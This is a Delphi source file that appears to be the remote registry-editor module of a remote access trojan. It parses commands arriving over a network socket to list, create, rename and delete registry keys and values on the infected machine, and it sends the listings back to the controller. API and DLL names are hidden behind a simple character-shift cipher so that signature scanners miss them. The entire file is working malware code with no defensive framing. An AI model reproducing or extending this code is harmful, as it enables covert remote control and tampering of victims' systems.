unit UnitRegEdit;

interface

uses
  applicationunit,windows,socketunit, unitshareddata, CompressionStreamUnit,ShlObj,ShFolder,
    ShellAPi, ImageHlp, MiniReg;
var
  NewSHDeleteKey: function(root : HKEY; subkey : Pchar) : boolean; stdcall;

procedure ParseData(Socket: TClientSocket; Data: string); forward;

implementation

procedure SendData(Socket: TClientSocket; Data: string);
begin
  UnitSharedData.SendData(Socket,'RegEdit|' + Data);
end;

function StrToHKEY(sKey: String): HKEY;
begin
  sKey := CharUpper(PChar(sKey));
  if sKey = 'HKEY_CLASSES_ROOT' then Result := HKEY_CLASSES_ROOT;
  if sKey = 'HKEY_CURRENT_USER' then Result := HKEY_CURRENT_USER;
  if sKey = 'HKEY_LOCAL_MACHINE' then Result := HKEY_LOCAL_MACHINE;
  if sKey = 'HKEY_USERS' then Result := HKEY_USERS;
  if sKey = 'HKEY_CURRENT_CONFIG' then Result := HKEY_CURRENT_CONFIG;
end;

function RegWriteString(Key: HKey; SubKey: string; DataType: integer; Data: string; Value: string): string;
var
  RegKey: HKey;
begin
  Result := '';
  if RegCreateKey(Key,pchar(SubKey),RegKey) = ERROR_SUCCESS then begin;
    RegSetValueEx(RegKey,pchar(Data),0,DataType,pchar(Value),Length(Value));
    RegCloseKey(RegKey);
  end;
end;

function Decrypt2(str:string):string;
var
  i: integer;
  a: byte;
begin
  for i := 1 to length(str) do begin
    A := ord(Str[i]);
    result := result + char(a-1);
  end;
end;

function NewGetProcAddress(Module,ApiName: string): pointer;
begin
  result := getprocaddress(loadlibrary(pchar(decrypt2(module))),pchar(decrypt2(apiname)));
end;

procedure ParseData(Socket: TClientSocket; Data: string);
var
  NewName,ValueData,ValueName,KeyType,Result,Hkey,SubKey: string;
  Command: string;
  Path: string;
begin
  Command := Split(Data,'|',1);
  Delete(Data,1,Length(Command)+1);


  if Command = 'EnumKeys' then begin
    Hkey := split(Data,'|',1);
    SubKey := split(Data,'|',2);
    RegEnumKeys(strtohkey(HKEY), SubKey, Result);
    SendData(Socket,Command + '|' + HKEY + '\' + SUBKEY + '|' + Result);
    RegEnumValues(strtohkey(HKEY), SubKey, Result);
    SendData(Socket,'EnumValues|' + Result);
  end;

  if Command = 'EnumValues' then begin
    Hkey := split(Data,'|',1);
    SubKey := split(Data,'|',2);
  end;

  if Command = 'DeleteKey' then begin
    Hkey := split(Data,'|',1);
    SubKey := split(Data,'|',2);
    NewSHDeleteKey := NewGetProcAddress('timxbqj/emm','TIEfmfufLfzB');
    NewSHDeleteKey(strtohkey(HKEY), pchar(SubKey));
  end;

  if Command = 'CreateKey' then begin
    Hkey := split(Data,'|',1);
    SubKey := split(Data,'|',2);
    KeyType := split(Data,'|',3);
    ValueName := split(Data,'|',4);
    ValueData := split(Data,'|',5);
    MiniReg._regCreateKey(strtohkey(HKEY),pchar(SubKey + ValueName));
  end;

  if Command = 'CreateValue' then begin
    Hkey := split(Data,'|',1);
    SubKey := split(Data,'|',2);
    KeyType := split(Data,'|',3);
    ValueName := split(Data,'|',4);
    ValueData := split(Data,'|',5);
    if strtoint(KeyType) = REG_DWORD then begin
      MiniReg.RegSetDWORD(strtohkey(HKEY),SubKey + ValueName,strtoint(ValueData));
      Exit;
    end;
    RegWriteString(strtohkey(HKEY),SubKey,strtoint(KeyType),ValueName,ValueData);
  end;

  if Command = 'RenameValue' then begin
    Hkey := split(Data,'|',1);
    SubKey := split(Data,'|',2);
    KeyType := split(Data,'|',3);
    ValueName := split(Data,'|',4);
    ValueData := split(Data,'|',5);
    NewName := split(Data,'|',6);
    MiniReg.RegDelValue(strtohkey(HKEY),SubKey + ValueName);
    if strtoint(KeyType) = REG_DWORD then begin
      MiniReg.RegSetDWORD(strtohkey(HKEY),SubKey + NewName,strtoint(ValueData));
      Exit;
    end;
    RegWriteString(strtohkey(HKEY),SubKey,strtoint(KeyType),NewName,ValueData);
  end;

  if Command = 'DeleteValue' then begin
    Hkey := split(Data,'|',1);
    SubKey := split(Data,'|',2);
    ValueName := split(Data,'|',3);
    MiniReg.RegDelValue(strtohkey(HKEY),SubKey + ValueName);
  end;

end;

end.
